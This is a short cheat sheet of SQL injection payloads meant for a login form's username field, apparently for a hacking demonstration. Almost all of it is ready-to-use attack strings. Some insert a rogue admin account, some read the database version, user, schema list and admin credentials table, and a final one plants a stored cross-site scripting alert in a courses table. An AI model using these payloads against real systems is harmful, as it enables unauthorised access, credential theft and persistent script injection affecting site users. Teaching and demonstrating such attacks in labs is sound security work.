==================
BASIC INJECTIONS
==================

# (inside username field)
==============================
chamod'; insert into admin (username,password) values('user','user'); --   [2 or more spaces]

chd'; SELECT @@version; --   # to select the version of the mysqli server

'; SELECT user();--   # to select the current user of DB

'; SELECT database();--  # to select the database the application connected to

'; SELECT schema_name FROM information_schema.schemata;--    # to get schemas from the main data base server

'; select * from admin; --   # to select all data from the admin(login) table





# when doing landing page XSS demo use this injection to inject to table and persist the script
==================================================================================================
'; insert into courses(courseName, description) values('EH','<script>alert("your have been hacked ..!");</script>'); --   